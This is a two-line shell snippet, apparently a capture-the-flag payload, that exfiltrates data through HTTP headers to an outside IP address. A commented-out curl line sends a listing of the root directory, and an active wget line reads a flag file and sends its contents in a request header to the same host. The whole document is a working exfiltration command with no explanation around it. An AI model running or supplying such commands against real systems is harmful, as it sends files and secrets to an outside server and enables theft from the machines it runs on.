#curl -H "result: $(ls -alh /)" http://140.113.69.47:5000
wget -qO- --header="result: $(cat /flag_d5487698d56593ce41fbf29744bba8fe | tr '\n' ' ')" http://140.113.69.47:5000
